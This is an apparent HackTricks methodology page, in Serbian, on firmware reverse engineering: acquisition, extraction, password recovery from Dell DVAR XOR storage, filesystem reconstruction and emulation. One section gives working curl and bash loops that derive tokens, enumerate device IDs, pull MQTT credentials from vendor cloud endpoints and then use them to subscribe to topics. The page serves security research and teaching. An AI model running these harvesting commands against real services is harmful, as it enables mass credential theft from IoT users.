# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

Za preuzimanje podataka preko izloženih hardverskih interfejsa pogledajte [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava ispravan rad uređaja upravljanjem komunikacijom između hardverskih komponenti i softvera sa kojim korisnici rade. Čuva se u trajnoj memoriji, čime se osigurava da uređaj može da pristupi ključnim instrukcijama čim se uključi, što omogućava pokretanje operativnog sistema. Analiza i potencijalno menjanje firmvera ključni su koraci u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Rasporedu hardvera i tehničkim listovima
- Metrikama baze koda i lokacijama izvornog koda
- Eksternim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i utvrđenim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su neprocenjivi, kao i analiza svih dostupnih softverskih komponenti otvorenog koda putem ručnog i automatizovanog pregleda. Alati poput [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmvera**

Firmver se može nabaviti na različite načine, od kojih svaki ima svoj nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** prema priloženim uputstvima
- **Preuzimanjem** sa zvaničnih sajtova za podršku
- Korišćenjem upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktnim pristupom **cloud storage-u**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Izdvajanjem** sa uređaja preko veza kao što su **UART**, **JTAG** ili **PICit**
- **Njuškanjem** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženjem i korišćenjem **hardkodiranih krajnjih tačaka za ažuriranje**
- **Dump-ovanjem** iz bootloader-a ili preko mreže
- **Uklanjanjem i očitavanjem** memorijskog čipa, kada sve ostalo ne uspe, pomoću odgovarajućih hardverskih alata

### Samo UART logovi: prinudno pokretanje root shell-a preko U-Boot env-a u flash-u

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete prinudno pokrenuti init shell tako što ćete **izmeniti U-Boot environment blob** van uređaja:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo flešujte samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija dostupna za upis preko spoljnog pristupa flash memoriji.

## Analiza firmvera

Sada kada **imate firmver**, potrebno je da iz njega izdvojite informacije kako biste znali kako da postupite. Evo nekoliko alata koje možete da koristite:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću komande `binwalk -E <bin>`. Ako je entropija niska, slika verovatno nije šifrovana. Ako je visoka, verovatno je šifrovana (ili na neki način komprimovana).

Pored toga, pomoću ovih alata možete izdvojiti **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili pomoću [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pregledati datoteku.

### Diferencijalna analiza flash memorije i povratno dobavljiva XOR skladišta tajni

Kada format skladištenja neke postavke firmware-a nije dokumentovan, prvo napravite nekoliko očitavanja iste flash memorije, promenite **tačno jednu** postavku, ponovo napravite dump celog čipa i uporedite pomeraje. Ponavljanjem eksperimenta sa kontrolisanim vrednostima možete razlikovati tu postavku od brojača i metapodataka o upisivanju; promene na novim pomerajima umesto na postojećim ukazuju na skladište koje se samo dopisuje ili ima log-strukturisanu organizaciju. Sačuvajte i obrisane/tombstone stavke jer njihovi bajtovi sa sadržajem i dalje mogu da se povrate.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon lociranja regiona, izdvojite module firmvera pomoću alata kao što je `binwalk` i izvršite reverzni inženjering funkcija za upisivanje/proveru u Ghidra-i. U kodu potvrdite granice polja, padding, indeksiranje ključa i izvođenje ključa, umesto da šemu zaključujete samo na osnovu obrazaca u ciphertext-u.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovanog padding-a sa nulama

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine je naročito izloženo kada se njegov padding nulama prostire preko svih indeksa ponavljajućeg XOR ključa: šifrovani padding direktno otkriva te bajtove ključa jer je `0x00 XOR key_byte = key_byte`. Ako su pokriveni svi indeksi ključa, rekonstrušite ključ iz završnog dela ciphertext-a i dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Dell-ov ranjivi DVAR format BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je u otvorenom tekstu, dok se za bajtove `1..31` koristi ponavljajući ključ od 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nule pre XOR operacije. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, pa se ceo ključ i lozinka mogu rekonstruisati bez brute force-a:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvucite ključeve iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini ulaz koji zavisi od lozinke je njen prvi bajt u čistom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele ključ. Grupisanje aktivnih i obrisanih zapisa prema tom bajtu omogućava da kratak istorijski zapis otkrije ceo ključ putem dopune i dešifruje trenutno duži zapis čija dopuna sama po sebi nije dovoljna. Rotacija lozinke zato može povećati izloženost kada se stari šifrat označi za brisanje, umesto da se ukloni.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove bajtove uskladištenih podataka i ključeva. Napravite ga iz checkout-a i skenirajte proverenu flash sliku na sledeći način:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parser-e odbacujte lažno pozitivne rezultate proverom strukture zapisa, ograničenja za štampive znakove, popune nulama, entropije ključa i doslednosti na mestu gde se ključ ponavlja. Ako ponovljeni dump-ovi pokazuju retke promene bitova pri svakom upisu, navedite uočene maske i rangirajte moguće ispravke prema ovim ograničenjima, ali prijavite dvosmislene znakove umesto da heuristički rezultat predstavite kao tačno izdvajanje.<sup>[[12]](#references)</sup>

Verifikatori lozinki treba da čuvaju soljeni, iterirani jednosmerni hash, a ne reverzibilni šifrat, dok skladišta sa log-strukturom treba bezbedno da uklanjaju zastareli tajni materijal.<sup>[[12]](#references)</sup>

### Preuzimanje datotečnog sistema

Pomoću prethodno navedenih komentisanih alata, kao što je `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **izdvojite datotečni sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu po tipu datotečnog sistema**, koji je najčešće jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje datotečnog sistema

Ponekad binwalk **nema magični bajt datotečnog sistema u svojim potpisima**. U tim slučajevima, pomoću binwalk-a **pronađite pomeraj datotečnog sistema i izdvojite kompresovani datotečni sistem** iz binarne datoteke, a zatim **ručno izdvojite** datotečni sistem prema njegovom tipu prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs sistema datoteka.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će nakon toga biti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ponovno sastavljanje podeljenih ugrađenih korenskih sistema datoteka

Ako sirovi eMMC/SSD dump sadrži ispravno zaglavlje sistema datoteka, ali se njegovi pomaci metapodataka protežu izvan nominalne particije, nemoj ga odmah klasifikovati kao oštećen. Ugrađeni boot kod može da sastavi pravi korenski uređaj iz više fizičkih opsega pomoću Device Mapper-a, pa izdvajanje jedne GPT particije daje samo prvi segment.<sup>[[9]](#references)</sup>

#### Početna procena kompletne slike medija

Najpre proveri da li je pribavljanje podataka završeno, da li je veličina stabilna i da li neki proces i dalje drži sliku otvorenom za upis. Ako naziv datoteke sadrži početnu/krajnju adresu, uporedi taj opseg sa stvarnim brojem bajtova. Oporavi GPT u režimu samo za čitanje i priključi samo potreban opseg; **nemoj** pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici, jer može doći do sukoba grupa volumena i neželjenih upisa.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferirajte disposable VM kada originalna init logika ili LVM stack moraju da vide celu sliku. Istorijski boot logovi sa standardne boot particije posebno su korisni: bootloader je možda zabeležio pomeraje proprietary-container-a, dužine komponenti, izbor slota, pravila poravnanja i verifikaciju potpisa. Iskoristite te vrednosti da izdvojite ugrađenu komandnu liniju, kernel i initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, magic bytes i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Oporavite mapu blokova pri pokretanju

Izdvojite initramfs kernela i izvršite reverse engineering njegovog `/init` fajla i svih storage biblioteka. U [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), pratite reference stringova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i formira tabelu. Korisne početne tačke za radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više pratećih uređaja. Oporavljena tabela sa dva segmenta obično ima sledeći oblik (sve pozicije i dužine izražene su u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Ponovite aritmetiku mašinskog koda tačno, uključujući širinu celog broja, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže na granicu od 4 KiB i tek onda je pretvara u sektore od 512 bajtova; ako ga zamenite izrazom `p4_bytes // 512`, izabrani završni segment pomeriće se za `p4_bytes % 4096` kad god particija nije poravnata na granicu stranice.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruišite neparticionisanu sliku za analizu kopiranjem opsega redosledom iz tabele, koristeći ograničene veličine blokova umesto učitavanja celog dump-a medija u memoriju. Time se izbegava i pravljenje host-side mapper uređaja. GPT-om izvedene pomake, obrnute brojeve sektora i rezultujuću dužinu izlaza proverite zasebnim tvrdnjama.<sup>[[9]](#references)</sup>

#### Razlikujte oštećenje od konstantne greške u rekonstrukciji

Za SquashFS proverite magic vrednost `hsqs` i dekodirajte 64-bitno little-endian polje `bytes_used` na pomaku 40 u superbloku pre pokretanja komande `unsquashfs`. Ako ekstrakcija ne uspe u nekoliko nepovezanih struktura, pretražite širok opseg oko očekivanih pozicija i zahtevajte snažne strukturne kandidate: blok metapodataka koji može da se dekompresuje, nekoliko uzastopnih ispravnih unosa direktorijuma, uverljiva polja inode-a, root inode usklađen sa brojem inode-ova ili ispravnu strukturu metapodataka integriteta. Jedno poklapanje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada isti potpisani pomeraj učini nezavisne strukture ispravnim — na primer, metapodatke direktorijuma i verity zapis — verovatni uzrok je sistematska greška u početnoj poziciji segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na granice sektora/stranica pre nego što pokušate oporavak napuštenih datoteka ili zakrpljivanje metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, razdvojite granice zaštite: LUKS volumeni čiji su ključevi zapečaćeni pomoću TPM-a štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet osnovnog sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen za originalni fizički TPM, a pokretanje izmenjenog SquashFS-a pomoću init-a namenjenog samo istraživanju, koji izostavlja proveru verity-ja, ne falsifikuje njegov potpis niti zaobilazi dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmvera

Kada se firmver pribavi, neophodno je detaljno ga analizirati kako bi se razumela njegova struktura i moguće ranjivosti. Ovaj postupak podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz slike firmvera.

### Alati za početnu analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju nizova znakova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenio status enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje fajl sistema

Pomoću `binwalk -ev <bin>` obično se može izdvojiti fajl sistem, često u direktorijum nazvan po tipu fajl sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl sistema zbog nedostajućih magic bajtova, potrebno je ručno izdvajanje. To podrazumeva korišćenje alata `binwalk` za pronalaženje offseta fajl sistema, a zatim komande `dd` za izdvajanje fajl sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa sistema datoteka (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza sistema datoteka

Kada se sistem datoteka izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se usmerava na nezaštićene mrežne demone, hardkodovane akreditive, API endpoint-e, funkcionalnosti servera za ažuriranje, nekompajlirani kod, skripte za pokretanje i kompajlirane binarne datoteke za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati uključuju:

- **etc/shadow** i **etc/passwd** za korisničke akreditive
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke zbog potencijalnih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene veb-servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti u sistemu datoteka:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

Potrebno je ispitati ranjivosti u izvornom kodu i kompajliranim binarnim datotekama pronađenim u sistemu datoteka. Alati poput **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u prepoznavanju nezaštićenih binarnih datoteka koje bi mogle biti iskorišćene.

## Prikupljanje cloud konfiguracije i MQTT akreditiva pomoću izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u čistom tekstu i prefikse tema.

Praktični postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i zabeležite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a cloud konfiguracije i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavi STATIC_KEY i algoritam tokena iz firmware-a

- Učitaj binarne fajlove u Ghidra/radare2 i potraži konfiguracionu putanju ("/pf/") ili upotrebu MD5.
- Potvrdi algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedi token u Bash-u i pretvori heš u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl-a; raščlanite ga pomoću jq da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotrebite nešifrovani MQTT i slabe ACL-ove tema (ako postoje)

- Koristite otkrivene akreditive da biste se pretplatili na teme za održavanje i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Nabrojte predvidljive ID-jeve uređaja (u velikom obimu, uz odobrenje)

- Mnogi ekosistemi ugrađuju bajtove OUI-ja/proizvoda/tipa dobavljača, a zatim sekvencijalni sufiks.
- Možete iterirati kroz moguće ID-jeve, programski izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Napomene
- Uvek pribavite izričito odobrenje pre pokušaja masovnog enumerisanja.
- Kad god je moguće, dajte prednost emulaciji ili statičkoj analizi za otkrivanje tajni, bez izmene ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prenos root filesystem-a ili određenih binarnih datoteka na uređaj sa odgovarajućom arhitekturom i endianness-om, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može olakšati dalja testiranja.

### Emulacija pojedinačnih binarnih datoteka

Za analizu pojedinačnih programa ključno je utvrditi endianness programa i arhitekturu CPU-a.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti sledeća komanda:

```bash
file ./squashfs-root/bin/busybox
```

A za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian formata koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Kod ARM binarnih datoteka postupak je sličan, a za emulaciju se koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmvera, automatizujući proces i olakšavajući dinamičku analizu.

### Rekonstrukcija podeljenih i verifikovanih root sistema datoteka za emulaciju

Ako je SquashFS superblok čitljiv, ali su pomeraji inode-a, direktorijuma ili tabele fragmenata nemogući, nemojte odmah menjati `unsquashfs`. Obrnuto analizirajte rani boot binarni fajl i reprodukujte graf blokovskih uređaja koji on kreira: ugrađeni sistemi mogu da izlože nominalnu root particiju, ali da stvarni sistem datoteka naprave pomoću `dm-linear` mapiranja koje dodaje sektore preuzete sa druge particije. Provere koje se oslanjaju samo na superblok mogu da prođu čak i kada su svi naredni blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Sačuvajte aritmetiku firmvera tačno. Posebno utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja bitova i skraćivanje prvobitnim redosledom; i uzmite u obzir završne regione koji zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre skraćuje vrednost na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena sa `partition_bytes // 512` može da pomeri dodati opseg za nekoliko kilobajta i ošteti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Koristan postupak validacije je:<sup>[[11]](#references)</sup>

1. Iz verifier/init binarnog fajla utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite ili mapirajte opsege bez menjanja pravila poravnanja.
3. Ako ekstrakcija i dalje ne uspeva, pretražite samo mali prozor oko predviđene granice i zahtevajte nekoliko uzastopnih validnih struktura metapodataka, umesto da prihvatite samo naizgled verovatan superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešan prolazak kroz sve direktorijume i fragmente predstavlja jači dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene zamenom proizvođačevog verifikacionog PID 1 malim, statički linkovanim init procesom. Ovo je **zamena boot lanca u laboratorijskom okruženju**, a ne zaobilaženje dm-verity, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog u TPM-u.<sup>[[11]](#references)</sup>

Zamenjujući init treba da oponaša operativne delove originalnog boot procesa: montira `devtmpfs`, poziva `setsid()`, povezuje `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, čeka da bude dostupan zadati blokovski uređaj, montira izmenjeni root samo za čitanje, odvaja pseudo-sisteme datoteka starog root-a, premešta novo montiranje na `/`, poziva `chroot` i izvršava (`execve()`) originalni `/sbin/init` firmvera. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk, montiran samo za čitanje, obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Otklanjanje grešaka u stanju slike van mreže

Pregledajte trajno stanje izvan gosta kada sporo pokretanje, destruktivne početne skripte ili nepouzdano evidentiranje konzole otežavaju otkrivanje uzroka greške. Nikada nemojte povezivati overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite LVM pretragu na predviđenu NBD particiju i deaktivirajte grupu volumena pre nego što je isključite.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Radi ponovljivog izolovanja kvarova, upisujte vremenski označene marker datoteke na stabilan volumen na koji može da se upisuje i proveravajte ih offline; `/dev/kmsg`, FIFO-ovi i prolazne konzole mogu da daju lažno negativne rezultate zbog ograničavanja brzine ili ranog prekida procesa. Takođe uporedite tačne interfejse kroz slojeve pre nego što menjate nepovezan kod: `uname -r` naspram `/lib/modules/`, funkcije ext4-a na disku naspram konfiguracije kernela i generaciju Mesa `libGL` biblioteke naspram DRI ABI-ja i naziva drajvera izvedenih iz PCI podataka. Komponenta može da postoji, pa čak i da se uspešno učita pomoću `dlopen()`, a da ipak ne može da se koristi zato što njen potrošač očekuje drugačiji ABI.<sup>[[11]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi okruženje stvarnog ili emuliranog uređaja. Neophodno je zadržati shell pristup operativnom sistemu i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će povremeno biti potrebno ponovo pokrenuti emulaciju. Analizom treba ponovo obuhvatiti sistem datoteka, iskoristiti izložene veb-stranice i mrežne servise i istražiti ranjivosti bootloadera. Testovi integriteta firmware-a ključni su za prepoznavanje potencijalnih ranjivosti backdoor tipa.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja obuhvata interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i otkrivanje ranjivosti pomoću fuzzing-a i drugih tehnika.

